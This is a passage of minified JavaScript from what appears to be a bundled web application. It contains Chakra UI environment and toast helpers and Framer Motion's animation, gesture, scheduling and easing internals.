                  getWindow: () => {
                      var e, t;
                      return null != (t = null == (e = o.current) ? void 0 : e.ownerDocument.defaultView) ? t : window;
                  },
              },
          [n]
      ),
      i = !r || !n;
  return Q.jsxs(lC.Provider, { value: a, children: [t, i && Q.jsx("span", { id: "__chakra_env", hidden: !0, ref: o })] });
}
(lC.displayName = "EnvironmentContext"), (cC.displayName = "EnvironmentProvider");
var uC = (e) => {
      const { children: t, colorModeManager: n, portalZIndex: r, resetScope: o, resetCSS: a = !0, theme: i = {}, environment: s, cssVarsRoot: l, disableEnvironment: c, disableGlobalStyle: u } = e,
          d = Q.jsx(cC, { environment: s, disabled: c, children: t });
      return Q.jsx(aC, {
          theme: i,
          cssVarsRoot: l,
          children: Q.jsxs(hg, { colorModeManager: n, options: i.config, children: [a ? Q.jsx(Xm, { scope: o }) : Q.jsx(Ym, {}), !u && Q.jsx(sC, {}), r ? Q.jsx(Zm, { zIndex: r, children: d }) : d] }),
      });
  },
  dC = (e, t) => e.find((e) => e.id === t);
function fC(e, t) {
  const n = pC(e, t);
  return { position: n, index: n ? e[n].findIndex((e) => e.id === t) : -1 };
}
function pC(e, t) {
  for (const [n, r] of Object.entries(e)) if (dC(r, t)) return n;
}
function hC(e) {
  return {
      position: "fixed",
      zIndex: "var(--toast-z-index, 5500)",
      pointerEvents: "none",
      display: "flex",
      flexDirection: "column",
      margin: "top" === e || "bottom" === e ? "0 auto" : void 0,
      top: e.includes("top") ? "env(safe-area-inset-top, 0px)" : void 0,
      bottom: e.includes("bottom") ? "env(safe-area-inset-bottom, 0px)" : void 0,
      right: e.includes("left") ? void 0 : "env(safe-area-inset-right, 0px)",
      left: e.includes("right") ? void 0 : "env(safe-area-inset-left, 0px)",
  };
}
function mC(e, t) {
  const n = (function (e, t = []) {
      const n = D.useRef(e);
      return (
          D.useEffect(() => {
              n.current = e;
          }),
          D.useCallback((...e) => {
              var t;
              return null == (t = n.current) ? void 0 : t.call(n, ...e);
          }, t)
      );
  })(e);
  D.useEffect(() => {
      if (null == t) return;
      let e = null;
      return (
          (e = window.setTimeout(() => {
              n();
          }, t)),
          () => {
              e && window.clearTimeout(e);
          }
      );
  }, [t, n]);
}
function gC(e, t) {
  const n = D.useRef(!1),
      r = D.useRef(!1);
  D.useEffect(() => {
      if (n.current && r.current) return e();
      r.current = !0;
  }, t),
      D.useEffect(
          () => (
              (n.current = !0),
              () => {
                  n.current = !1;
              }
          ),
          []
      );
}
const vC = D.createContext({ transformPagePoint: (e) => e, isStatic: !1, reducedMotion: "never" }),
  yC = D.createContext({}),
  bC = D.createContext(null),
  xC = "undefined" != typeof document,
  wC = xC ? D.useLayoutEffect : D.useEffect,
  SC = D.createContext({ strict: !1 });
function kC(e) {
  return "object" == typeof e && Object.prototype.hasOwnProperty.call(e, "current");
}
function EC(e) {
  return "string" == typeof e || Array.isArray(e);
}
function CC(e) {
  return "object" == typeof e && "function" == typeof e.start;
}
const _C = ["animate", "whileInView", "whileFocus", "whileHover", "whileTap", "whileDrag", "exit"],
  PC = ["initial", ..._C];
function TC(e) {
  return CC(e.animate) || PC.some((t) => EC(e[t]));
}
function RC(e) {
  return Boolean(TC(e) || e.variants);
}
function zC(e) {
  const { initial: t, animate: n } = (function (e, t) {
      if (TC(e)) {
          const { initial: t, animate: n } = e;
          return { initial: !1 === t || EC(t) ? t : void 0, animate: EC(n) ? n : void 0 };
      }
      return !1 !== e.inherit ? t : {};
  })(e, D.useContext(yC));
  return D.useMemo(() => ({ initial: t, animate: n }), [AC(t), AC(n)]);
}
function AC(e) {
  return Array.isArray(e) ? e.join(" ") : e;
}
const jC = {
      animation: ["animate", "variants", "whileHover", "whileTap", "exit", "whileInView", "whileFocus", "whileDrag"],
      exit: ["exit"],
      drag: ["drag", "dragControls"],
      focus: ["whileFocus"],
      hover: ["whileHover", "onHoverStart", "onHoverEnd"],
      tap: ["whileTap", "onTap", "onTapStart", "onTapCancel"],
      pan: ["onPan", "onPanStart", "onPanSessionStart", "onPanEnd"],
      inView: ["whileInView", "onViewportEnter", "onViewportLeave"],
      layout: ["layout", "layoutId"],
  },
  OC = {};
for (const oN in jC) OC[oN] = { isEnabled: (e) => jC[oN].some((t) => !!e[t]) };
const FC = D.createContext({}),
  NC = D.createContext({}),
  MC = Symbol.for("motionComponentSymbol");
function LC({ preloadedFeatures: e, createVisualElement: t, useRender: n, useVisualState: r, Component: o }) {
  e &&
      (function (e) {
          for (const t in e) OC[t] = { ...OC[t], ...e[t] };
      })(e);
  const a = D.forwardRef(function (a, i) {
      let s;
      const l = { ...D.useContext(vC), ...a, layoutId: BC(a) },
          { isStatic: c } = l,
          u = zC(a),
          d = r(a, c);
      if (!c && xC) {
          u.visualElement = (function (e, t, n, r) {
              const { visualElement: o } = D.useContext(yC),
                  a = D.useContext(SC),
                  i = D.useContext(bC),
                  s = D.useContext(vC).reducedMotion,
                  l = D.useRef();
              (r = r || a.renderer), !l.current && r && (l.current = r(e, { visualState: t, parent: o, props: n, presenceContext: i, blockInitialAnimation: !!i && !1 === i.initial, reducedMotionConfig: s }));
              const c = l.current;
              return (
                  D.useInsertionEffect(() => {
                      c && c.update(n, i);
                  }),
                  wC(() => {
                      c && c.render();
                  }),
                  D.useEffect(() => {
                      c && c.updateFeatures();
                  }),
                  (window.HandoffAppearAnimations ? wC : D.useEffect)(() => {
                      c && c.animationState && c.animationState.animateChanges();
                  }),
                  c
              );
          })(o, d, l, t);
          const n = D.useContext(NC),
              r = D.useContext(SC).strict;
          u.visualElement && (s = u.visualElement.loadFeatures(l, r, e, n));
      }
      return D.createElement(
          yC.Provider,
          { value: u },
          s && u.visualElement ? D.createElement(s, { visualElement: u.visualElement, ...l }) : null,
          n(
              o,
              a,
              (function (e, t, n) {
                  return D.useCallback(
                      (r) => {
                          r && e.mount && e.mount(r), t && (r ? t.mount(r) : t.unmount()), n && ("function" == typeof n ? n(r) : kC(n) && (n.current = r));
                      },
                      [t]
                  );
              })(d, u.visualElement, i),
              d,
              c,
              u.visualElement
          )
      );
  });
  return (a[MC] = o), a;
}
function BC({ layoutId: e }) {
  const t = D.useContext(FC).id;
  return t && void 0 !== e ? t + "-" + e : e;
}
function IC(e) {
  function t(t, n = {}) {
      return LC(e(t, n));
  }
  if ("undefined" == typeof Proxy) return t;
  const n = new Map();
  return new Proxy(t, { get: (e, r) => (n.has(r) || n.set(r, t(r)), n.get(r)) });
}
const DC = ["animate", "circle", "defs", "desc", "ellipse", "g", "image", "line", "filter", "marker", "mask", "metadata", "path", "pattern", "polygon", "polyline", "rect", "stop", "switch", "symbol", "svg", "text", "tspan", "use", "view"];
function $C(e) {
  return "string" == typeof e && !e.includes("-") && !!(DC.indexOf(e) > -1 || /[A-Z]/.test(e));
}
const VC = {};
const UC = ["transformPerspective", "x", "y", "z", "translateX", "translateY", "translateZ", "scale", "scaleX", "scaleY", "rotate", "rotateX", "rotateY", "rotateZ", "skew", "skewX", "skewY"],
  WC = new Set(UC);
function HC(e, { layout: t, layoutId: n }) {
  return WC.has(e) || e.startsWith("origin") || ((t || void 0 !== n) && (!!VC[e] || "opacity" === e));
}
const qC = (e) => Boolean(e && e.getVelocity),
  YC = { x: "translateX", y: "translateY", z: "translateZ", transformPerspective: "perspective" },
  XC = UC.length;
const GC = (e) => (t) => "string" == typeof t && t.startsWith(e),
  QC = GC("--"),
  KC = GC("var(--"),
  ZC = (e, t) => (t && "number" == typeof e ? t.transform(e) : e),
  JC = (e, t, n) => Math.min(Math.max(n, e), t),
  e_ = { test: (e) => "number" == typeof e, parse: parseFloat, transform: (e) => e },
  t_ = { ...e_, transform: (e) => JC(0, 1, e) },
  n_ = { ...e_, default: 1 },
  r_ = (e) => Math.round(1e5 * e) / 1e5,
  o_ = /(-)?([\d]*\.?[\d])+/g,
  a_ = /(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))/gi,
  i_ = /^(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))$/i;
function s_(e) {
  return "string" == typeof e;
}
const l_ = (e) => ({ test: (t) => s_(t) && t.endsWith(e) && 1 === t.split(" ").length, parse: parseFloat, transform: (t) => `${t}${e}` }),
  c_ = l_("deg"),
  u_ = l_("%"),
  d_ = l_("px"),
  f_ = l_("vh"),
  p_ = l_("vw"),
  h_ = { ...u_, parse: (e) => u_.parse(e) / 100, transform: (e) => u_.transform(100 * e) },
  m_ = { ...e_, transform: Math.round },
  g_ = {
      borderWidth: d_,
      borderTopWidth: d_,
      borderRightWidth: d_,
      borderBottomWidth: d_,
      borderLeftWidth: d_,
      borderRadius: d_,
      radius: d_,
      borderTopLeftRadius: d_,
      borderTopRightRadius: d_,
      borderBottomRightRadius: d_,
      borderBottomLeftRadius: d_,
      width: d_,
      maxWidth: d_,
      height: d_,
      maxHeight: d_,
      size: d_,
      top: d_,
      right: d_,
      bottom: d_,
      left: d_,
      padding: d_,
      paddingTop: d_,
      paddingRight: d_,
      paddingBottom: d_,
      paddingLeft: d_,
      margin: d_,
      marginTop: d_,
      marginRight: d_,
      marginBottom: d_,
      marginLeft: d_,
      rotate: c_,
      rotateX: c_,
      rotateY: c_,
      rotateZ: c_,
      scale: n_,
      scaleX: n_,
      scaleY: n_,
      scaleZ: n_,
      skew: c_,
      skewX: c_,
      skewY: c_,
      distance: d_,
      translateX: d_,
      translateY: d_,
      translateZ: d_,
      x: d_,
      y: d_,
      z: d_,
      perspective: d_,
      transformPerspective: d_,
      opacity: t_,
      originX: h_,
      originY: h_,
      originZ: d_,
      zIndex: m_,
      fillOpacity: t_,
      strokeOpacity: t_,
      numOctaves: m_,
  };
function v_(e, t, n, r) {
  const { style: o, vars: a, transform: i, transformOrigin: s } = e;
  let l = !1,
      c = !1,
      u = !0;
  for (const d in t) {
      const e = t[d];
      if (QC(d)) {
          a[d] = e;
          continue;
      }
      const n = g_[d],
          r = ZC(e, n);
      if (WC.has(d)) {
          if (((l = !0), (i[d] = r), !u)) continue;
          e !== (n.default || 0) && (u = !1);
      } else d.startsWith("origin") ? ((c = !0), (s[d] = r)) : (o[d] = r);
  }
  if (
      (t.transform ||
          (l || r
              ? (o.transform = (function (e, { enableHardwareAcceleration: t = !0, allowTransformNone: n = !0 }, r, o) {
                    let a = "";
                    for (let i = 0; i < XC; i++) {
                        const t = UC[i];
                        void 0 !== e[t] && (a += `${YC[t] || t}(${e[t]}) `);
                    }
                    return t && !e.z && (a += "translateZ(0)"), (a = a.trim()), o ? (a = o(e, r ? "" : a)) : n && r && (a = "none"), a;
                })(e.transform, n, u, r))
              : o.transform && (o.transform = "none")),
      c)
  ) {
      const { originX: e = "50%", originY: t = "50%", originZ: n = 0 } = s;
      o.transformOrigin = `${e} ${t} ${n}`;
  }
}
const y_ = () => ({ style: {}, transform: {}, transformOrigin: {}, vars: {} });
function b_(e, t, n) {
  for (const r in t) qC(t[r]) || HC(r, n) || (e[r] = t[r]);
}
function x_(e, t, n) {
  const r = {};
  return (
      b_(r, e.style || {}, e),
      Object.assign(
          r,
          (function ({ transformTemplate: e }, t, n) {
              return D.useMemo(() => {
                  const r = y_();
                  return v_(r, t, { enableHardwareAcceleration: !n }, e), Object.assign({}, r.vars, r.style);
              }, [t]);
          })(e, t, n)
      ),
      e.transformValues ? e.transformValues(r) : r
  );
}
function w_(e, t, n) {
  const r = {},
      o = x_(e, t, n);
  return (
      e.drag && !1 !== e.dragListener && ((r.draggable = !1), (o.userSelect = o.WebkitUserSelect = o.WebkitTouchCallout = "none"), (o.touchAction = !0 === e.drag ? "none" : "pan-" + ("x" === e.drag ? "y" : "x"))),
      void 0 === e.tabIndex && (e.onTap || e.onTapStart || e.whileTap) && (r.tabIndex = 0),
      (r.style = o),
      r
  );
}
const S_ = new Set([
  "animate",
  "exit",
  "variants",
  "initial",
  "style",
  "values",
  "variants",
  "transition",
  "transformTemplate",
  "transformValues",
  "custom",
  "inherit",
  "onLayoutAnimationStart",
  "onLayoutAnimationComplete",
  "onLayoutMeasure",
  "onBeforeLayoutMeasure",
  "onAnimationStart",
  "onAnimationComplete",
  "onUpdate",
  "onDragStart",
  "onDrag",
  "onDragEnd",
  "onMeasureDragConstraints",
  "onDirectionLock",
  "onDragTransitionEnd",
  "_dragX",
  "_dragY",
  "onHoverStart",
  "onHoverEnd",
  "onViewportEnter",
  "onViewportLeave",
  "ignoreStrict",
  "viewport",
]);
function k_(e) {
  return e.startsWith("while") || (e.startsWith("drag") && "draggable" !== e) || e.startsWith("layout") || e.startsWith("onTap") || e.startsWith("onPan") || S_.has(e);
}
let E_ = (e) => !k_(e);
try {
  (C_ = require("@emotion/is-prop-valid").default) && (E_ = (e) => (e.startsWith("on") ? !k_(e) : C_(e)));
} catch (rN) {}
var C_;
function __(e, t, n) {
  return "string" == typeof e ? e : d_.transform(t + n * e);
}
const P_ = { offset: "stroke-dashoffset", array: "stroke-dasharray" },
  T_ = { offset: "strokeDashoffset", array: "strokeDasharray" };
function R_(e, { attrX: t, attrY: n, attrScale: r, originX: o, originY: a, pathLength: i, pathSpacing: s = 1, pathOffset: l = 0, ...c }, u, d, f) {
  if ((v_(e, c, u, f), d)) return void (e.style.viewBox && (e.attrs.viewBox = e.style.viewBox));
  (e.attrs = e.style), (e.style = {});
  const { attrs: p, style: h, dimensions: m } = e;
  p.transform && (m && (h.transform = p.transform), delete p.transform),
      m &&
          (void 0 !== o || void 0 !== a || h.transform) &&
          (h.transformOrigin = (function (e, t, n) {
              return `${__(t, e.x, e.width)} ${__(n, e.y, e.height)}`;
          })(m, void 0 !== o ? o : 0.5, void 0 !== a ? a : 0.5)),
      void 0 !== t && (p.x = t),
      void 0 !== n && (p.y = n),
      void 0 !== r && (p.scale = r),
      void 0 !== i &&
          (function (e, t, n = 1, r = 0, o = !0) {
              e.pathLength = 1;
              const a = o ? P_ : T_;
              e[a.offset] = d_.transform(-r);
              const i = d_.transform(t),
                  s = d_.transform(n);
              e[a.array] = `${i} ${s}`;
          })(p, i, s, l, !1);
}
const z_ = () => ({ ...y_(), attrs: {} }),
  A_ = (e) => "string" == typeof e && "svg" === e.toLowerCase();
function j_(e, t, n, r) {
  const o = D.useMemo(() => {
      const n = z_();
      return R_(n, t, { enableHardwareAcceleration: !1 }, A_(r), e.transformTemplate), { ...n.attrs, style: { ...n.style } };
  }, [t]);
  if (e.style) {
      const t = {};
      b_(t, e.style, e), (o.style = { ...t, ...o.style });
  }
  return o;
}
function O_(e = !1) {
  return (t, n, r, { latestValues: o }, a) => {
      const i = ($C(t) ? j_ : w_)(n, o, a, t),
          s = (function (e, t, n) {
              const r = {};
              for (const o in e) ("values" === o && "object" == typeof e.values) || ((E_(o) || (!0 === n && k_(o)) || (!t && !k_(o)) || (e.draggable && o.startsWith("onDrag"))) && (r[o] = e[o]));
              return r;
          })(n, "string" == typeof t, e),
          l = { ...s, ...i, ref: r },
          { children: c } = n,
          u = D.useMemo(() => (qC(c) ? c.get() : c), [c]);
      return D.createElement(t, { ...l, children: u });
  };
}
const F_ = (e) => e.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase();
function N_(e, { style: t, vars: n }, r, o) {
  Object.assign(e.style, t, o && o.getProjectionStyles(r));
  for (const a in n) e.style.setProperty(a, n[a]);
}
const M_ = new Set([
  "baseFrequency",
  "diffuseConstant",
  "kernelMatrix",
  "kernelUnitLength",
  "keySplines",
  "keyTimes",
  "limitingConeAngle",
  "markerHeight",
  "markerWidth",
  "numOctaves",
  "targetX",
  "targetY",
  "surfaceScale",
  "specularConstant",
  "specularExponent",
  "stdDeviation",
  "tableValues",
  "viewBox",
  "gradientTransform",
  "pathLength",
  "startOffset",
  "textLength",
  "lengthAdjust",
]);
function L_(e, t, n, r) {
  N_(e, t, void 0, r);
  for (const o in t.attrs) e.setAttribute(M_.has(o) ? o : F_(o), t.attrs[o]);
}
function B_(e, t) {
  const { style: n } = e,
      r = {};
  for (const o in n) (qC(n[o]) || (t.style && qC(t.style[o])) || HC(o, e)) && (r[o] = n[o]);
  return r;
}
function I_(e, t) {
  const n = B_(e, t);
  for (const r in e)
      if (qC(e[r]) || qC(t[r])) {
          n[-1 !== UC.indexOf(r) ? "attr" + r.charAt(0).toUpperCase() + r.substring(1) : r] = e[r];
      }
  return n;
}
function D_(e, t, n, r = {}, o = {}) {
  return "function" == typeof t && (t = t(void 0 !== n ? n : e.custom, r, o)), "string" == typeof t && (t = e.variants && e.variants[t]), "function" == typeof t && (t = t(void 0 !== n ? n : e.custom, r, o)), t;
}
function $_(e) {
  const t = D.useRef(null);
  return null === t.current && (t.current = e()), t.current;
}
const V_ = (e) => Array.isArray(e),
  U_ = (e) => Boolean(e && "object" == typeof e && e.mix && e.toValue),
  W_ = (e) => (V_(e) ? e[e.length - 1] || 0 : e);
function H_(e) {
  const t = qC(e) ? e.get() : e;
  return U_(t) ? t.toValue() : t;
}
const q_ = (e) => (t, n) => {
  const r = D.useContext(yC),
      o = D.useContext(bC),
      a = () =>
          (function ({ scrapeMotionValuesFromProps: e, createRenderState: t, onMount: n }, r, o, a) {
              const i = { latestValues: Y_(r, o, a, e), renderState: t() };
              return n && (i.mount = (e) => n(r, e, i)), i;
          })(e, t, r, o);
  return n ? a() : $_(a);
};
function Y_(e, t, n, r) {
  const o = {},
      a = r(e, {});
  for (const f in a) o[f] = H_(a[f]);
  let { initial: i, animate: s } = e;
  const l = TC(e),
      c = RC(e);
  t && c && !l && !1 !== e.inherit && (void 0 === i && (i = t.initial), void 0 === s && (s = t.animate));
  let u = !!n && !1 === n.initial;
  u = u || !1 === i;
  const d = u ? s : i;
  if (d && "boolean" != typeof d && !CC(d)) {
      (Array.isArray(d) ? d : [d]).forEach((t) => {
          const n = D_(e, t);
          if (!n) return;
          const { transitionEnd: r, transition: a, ...i } = n;
          for (const e in i) {
              let t = i[e];
              if (Array.isArray(t)) {
                  t = t[u ? t.length - 1 : 0];
              }
              null !== t && (o[e] = t);
          }
          for (const e in r) o[e] = r[e];
      });
  }
  return o;
}
const X_ = {
      useVisualState: q_({
          scrapeMotionValuesFromProps: I_,
          createRenderState: z_,
          onMount: (e, t, { renderState: n, latestValues: r }) => {
              try {
                  n.dimensions = "function" == typeof t.getBBox ? t.getBBox() : t.getBoundingClientRect();
              } catch (gF) {
                  n.dimensions = { x: 0, y: 0, width: 0, height: 0 };
              }
              R_(n, r, { enableHardwareAcceleration: !1 }, A_(t.tagName), e.transformTemplate), L_(t, n);
          },
      }),
  },
  G_ = { useVisualState: q_({ scrapeMotionValuesFromProps: B_, createRenderState: y_ }) };
function Q_(e, t, n, r = { passive: !0 }) {
  return e.addEventListener(t, n, r), () => e.removeEventListener(t, n);
}
const K_ = (e) => ("mouse" === e.pointerType ? "number" != typeof e.button || e.button <= 0 : !1 !== e.isPrimary);
function Z_(e, t = "page") {
  return { point: { x: e[t + "X"], y: e[t + "Y"] } };
}
const J_ = (e) => (t) => K_(t) && e(t, Z_(t));
function eP(e, t, n, r) {
  return Q_(e, t, J_(n), r);
}
const tP = (e, t) => (n) => t(e(n)),
  nP = (...e) => e.reduce(tP);
function rP(e) {
  let t = null;
  return () => {
      const n = () => {
          t = null;
      };
      return null === t && ((t = e), n);
  };
}
const oP = rP("dragHorizontal"),
  aP = rP("dragVertical");
function iP(e) {
  let t = !1;
  if ("y" === e) t = aP();
  else if ("x" === e) t = oP();
  else {
      const e = oP(),
          n = aP();
      e && n
          ? (t = () => {
                e(), n();
            })
          : (e && e(), n && n());
  }
  return t;
}
function sP() {
  const e = iP(!0);
  return !e || (e(), !1);
}
class lP {
  constructor(e) {
      (this.isMounted = !1), (this.node = e);
  }
  update() {}
}
const cP = { delta: 0, timestamp: 0, isProcessing: !1 };
let uP = !0,
  dP = !1;
const fP = ["read", "update", "preRender", "render", "postRender"],
  pP = fP.reduce(
      (e, t) => (
          (e[t] = (function (e) {
              let t = [],
                  n = [],
                  r = 0,
                  o = !1,
                  a = !1;
              const i = new WeakSet(),
                  s = {
                      schedule: (e, a = !1, s = !1) => {
                          const l = s && o,
                              c = l ? t : n;
                          return a && i.add(e), -1 === c.indexOf(e) && (c.push(e), l && o && (r = t.length)), e;
                      },
                      cancel: (e) => {
                          const t = n.indexOf(e);
                          -1 !== t && n.splice(t, 1), i.delete(e);
                      },
                      process: (l) => {
                          if (o) a = !0;
                          else {
                              if (((o = !0), ([t, n] = [n, t]), (n.length = 0), (r = t.length), r))
                                  for (let n = 0; n < r; n++) {
                                      const r = t[n];
                                      r(l), i.has(r) && (s.schedule(r), e());
                                  }
                              (o = !1), a && ((a = !1), s.process(l));
                          }
                      },
                  };
              return s;
          })(() => (dP = !0))),
          e
      ),
      {}
  ),
  hP = (e) => pP[e].process(cP),
  mP = (e) => {
      (dP = !1), (cP.delta = uP ? 1e3 / 60 : Math.max(Math.min(e - cP.timestamp, 40), 1)), (cP.timestamp = e), (cP.isProcessing = !0), fP.forEach(hP), (cP.isProcessing = !1), dP && ((uP = !1), requestAnimationFrame(mP));
  },
  gP = fP.reduce((e, t) => {
      const n = pP[t];
      return (e[t] = (e, t = !1, r = !1) => (dP || ((dP = !0), (uP = !0), cP.isProcessing || requestAnimationFrame(mP)), n.schedule(e, t, r))), e;
  }, {});
function vP(e) {
  fP.forEach((t) => pP[t].cancel(e));
}
function yP(e, t) {
  const n = "pointer" + (t ? "enter" : "leave"),
      r = "onHover" + (t ? "Start" : "End");
  return eP(
      e.current,
      n,
      (n, o) => {
          if ("touch" === n.type || sP()) return;
          const a = e.getProps();
          e.animationState && a.whileHover && e.animationState.setActive("whileHover", t), a[r] && gP.update(() => a[r](n, o));
      },
      { passive: !e.getProps()[r] }
  );
}
const bP = (e, t) => !!t && (e === t || bP(e, t.parentElement)),
  xP = (e) => e;
function wP(e, t) {
  if (!t) return;
  const n = new PointerEvent("pointer" + e);
  t(n, Z_(n));
}
const SP = new WeakMap(),
  kP = new WeakMap(),
  EP = (e) => {
      const t = SP.get(e.target);
      t && t(e);
  },
  CP = (e) => {
      e.forEach(EP);
  };
function _P(e, t, n) {
  const r = (function ({ root: e, ...t }) {
      const n = e || document;
      kP.has(n) || kP.set(n, {});
      const r = kP.get(n),
          o = JSON.stringify(t);
      return r[o] || (r[o] = new IntersectionObserver(CP, { root: e, ...t })), r[o];
  })(t);
  return (
      SP.set(e, n),
      r.observe(e),
      () => {
          SP.delete(e), r.unobserve(e);
      }
  );
}
const PP = { some: 0, all: 1 };
const TP = {
  inView: {
      Feature: class extends lP {
          constructor() {
              super(...arguments), (this.hasEnteredView = !1), (this.isInView = !1);
          }
          startObserver() {
              this.unmount();
              const { viewport: e = {} } = this.node.getProps(),
                  { root: t, margin: n, amount: r = "some", once: o } = e,
                  a = { root: t ? t.current : void 0, rootMargin: n, threshold: "number" == typeof r ? r : PP[r] };
              return _P(this.node.current, a, (e) => {
                  const { isIntersecting: t } = e;
                  if (this.isInView === t) return;
                  if (((this.isInView = t), o && !t && this.hasEnteredView)) return;
                  t && (this.hasEnteredView = !0), this.node.animationState && this.node.animationState.setActive("whileInView", t);
                  const { onViewportEnter: n, onViewportLeave: r } = this.node.getProps(),
                      a = t ? n : r;
                  a && a(e);
              });
          }
          mount() {
              this.startObserver();
          }
          update() {
              if ("undefined" == typeof IntersectionObserver) return;
              const { props: e, prevProps: t } = this.node;
              ["amount", "margin", "root"].some(
                  (function ({ viewport: e = {} }, { viewport: t = {} } = {}) {
                      return (n) => e[n] !== t[n];
                  })(e, t)
              ) && this.startObserver();
          }
          unmount() {}
      },
  },
  tap: {
      Feature: class extends lP {
          constructor() {
              super(...arguments),
                  (this.removeStartListeners = xP),
                  (this.removeEndListeners = xP),
                  (this.removeAccessibleListeners = xP),
                  (this.startPointerPress = (e, t) => {
                      if ((this.removeEndListeners(), this.isPressing)) return;
                      const n = this.node.getProps(),
                          r = eP(
                              window,
                              "pointerup",
                              (e, t) => {
                                  if (!this.checkPressEnd()) return;
                                  const { onTap: n, onTapCancel: r } = this.node.getProps();
                                  gP.update(() => {
                                      bP(this.node.current, e.target) ? n && n(e, t) : r && r(e, t);
                                  });
                              },
                              { passive: !(n.onTap || n.onPointerUp) }
                          ),
                          o = eP(window, "pointercancel", (e, t) => this.cancelPress(e, t), { passive: !(n.onTapCancel || n.onPointerCancel) });
                      (this.removeEndListeners = nP(r, o)), this.startPress(e, t);
                  }),
                  (this.startAccessiblePress = () => {
                      const e = Q_(this.node.current, "keydown", (e) => {
                              if ("Enter" !== e.key || this.isPressing) return;
                              this.removeEndListeners(),
                                  (this.removeEndListeners = Q_(this.node.current, "keyup", (e) => {
                                      "Enter" === e.key &&
                                          this.checkPressEnd() &&
                                          wP("up", (e, t) => {
                                              const { onTap: n } = this.node.getProps();
                                              n && gP.update(() => n(e, t));
                                          });
                                  })),
                                  wP("down", (e, t) => {
                                      this.startPress(e, t);
                                  });
                          }),
                          t = Q_(this.node.current, "blur", () => {
                              this.isPressing && wP("cancel", (e, t) => this.cancelPress(e, t));
                          });
                      this.removeAccessibleListeners = nP(e, t);
                  });
          }
          startPress(e, t) {
              this.isPressing = !0;
              const { onTapStart: n, whileTap: r } = this.node.getProps();
              r && this.node.animationState && this.node.animationState.setActive("whileTap", !0), n && gP.update(() => n(e, t));
          }
          checkPressEnd() {
              this.removeEndListeners(), (this.isPressing = !1);
              return this.node.getProps().whileTap && this.node.animationState && this.node.animationState.setActive("whileTap", !1), !sP();
          }
          cancelPress(e, t) {
              if (!this.checkPressEnd()) return;
              const { onTapCancel: n } = this.node.getProps();
              n && gP.update(() => n(e, t));
          }
          mount() {
              const e = this.node.getProps(),
                  t = eP(this.node.current, "pointerdown", this.startPointerPress, { passive: !(e.onTapStart || e.onPointerStart) }),
                  n = Q_(this.node.current, "focus", this.startAccessiblePress);
              this.removeStartListeners = nP(t, n);
          }
          unmount() {
              this.removeStartListeners(), this.removeEndListeners(), this.removeAccessibleListeners();
          }
      },
  },
  focus: {
      Feature: class extends lP {
          constructor() {
              super(...arguments), (this.isActive = !1);
          }
          onFocus() {
              let e = !1;
              try {
                  e = this.node.current.matches(":focus-visible");
              } catch (gF) {
                  e = !0;
              }
              e && this.node.animationState && (this.node.animationState.setActive("whileFocus", !0), (this.isActive = !0));
          }
          onBlur() {
              this.isActive && this.node.animationState && (this.node.animationState.setActive("whileFocus", !1), (this.isActive = !1));
          }
          mount() {
              this.unmount = nP(
                  Q_(this.node.current, "focus", () => this.onFocus()),
                  Q_(this.node.current, "blur", () => this.onBlur())
              );
          }
          unmount() {}
      },
  },
  hover: {
      Feature: class extends lP {
          mount() {
              this.unmount = nP(yP(this.node, !0), yP(this.node, !1));
          }
          unmount() {}
      },
  },
};
function RP(e, t) {
  if (!Array.isArray(t)) return !1;
  const n = t.length;
  if (n !== e.length) return !1;
  for (let r = 0; r < n; r++) if (t[r] !== e[r]) return !1;
  return !0;
}
function zP(e, t, n) {
  const r = e.getProps();
  return D_(
      r,
      t,
      void 0 !== n ? n : r.custom,
      (function (e) {
          const t = {};
          return e.values.forEach((e, n) => (t[n] = e.get())), t;
      })(e),
      (function (e) {
          const t = {};
          return e.values.forEach((e, n) => (t[n] = e.getVelocity())), t;
      })(e)
  );
}
const AP = "data-" + F_("framerAppearId");
let jP = xP,
  OP = xP;
const FP = (e) => 1e3 * e,
  NP = (e) => e / 1e3,
  MP = !1,
  LP = (e) => Array.isArray(e) && "number" == typeof e[0];
function BP(e) {
  return Boolean(!e || ("string" == typeof e && DP[e]) || LP(e) || (Array.isArray(e) && e.every(BP)));
}
const IP = ([e, t, n, r]) => `cubic-bezier(${e}, ${t}, ${n}, ${r})`,
  DP = {
      linear: "linear",
      ease: "ease",
      easeIn: "ease-in",
      easeOut: "ease-out",
      easeInOut: "ease-in-out",
      circIn: IP([0, 0.65, 0.55, 1]),
      circOut: IP([0.55, 0, 1, 0.45]),
      backIn: IP([0.31, 0.01, 0.66, -0.59]),
      backOut: IP([0.33, 1.53, 0.69, 0.99]),
  };
function $P(e) {
  if (e) return LP(e) ? IP(e) : Array.isArray(e) ? e.map($P) : DP[e];
}
const VP = { waapi: () => Object.hasOwnProperty.call(Element.prototype, "animate") },
  UP = {},
  WP = {};
for (const oN in VP) WP[oN] = () => (void 0 === UP[oN] && (UP[oN] = VP[oN]()), UP[oN]);
const HP = (e, t, n) => (((1 - 3 * n + 3 * t) * e + (3 * n - 6 * t)) * e + 3 * t) * e,
  qP = 1e-7,
  YP = 12;
function XP(e, t, n, r) {
  if (e === t && n === r) return xP;
  const o = (t) =>
      (function (e, t, n, r, o) {
          let a,
              i,
              s = 0;
          do {
              (i = t + (n - t) / 2), (a = HP(i, r, o) - e), a > 0 ? (n = i) : (t = i);
          } while (Math.abs(a) > qP && ++s < YP);
          return i;
      })(t, 0, 1, e, n);
  return (e) => (0 === e || 1 === e ? e : HP(o(e), t, r));
}
const GP = XP(0.42, 0, 1, 1),
  QP = XP(0, 0, 0.58, 1),
  KP = XP(0.42, 0, 0.58, 1),
  ZP = (e) => Array.isArray(e) && "number" != typeof e[0],
  JP = (e) => (t) => (t <= 0.5 ? e(2 * t) / 2 : (2 - e(2 * (1 - t))) / 2),
  eT = (e) => (t) => 1 - e(1 - t),
  tT = (e) => 1 - Math.sin(Math.acos(e)),
  nT = eT(tT),
  rT = JP(nT),
  oT = XP(0.33, 1.53, 0.69, 0.99),
  aT = eT(oT),
  iT = JP(aT),
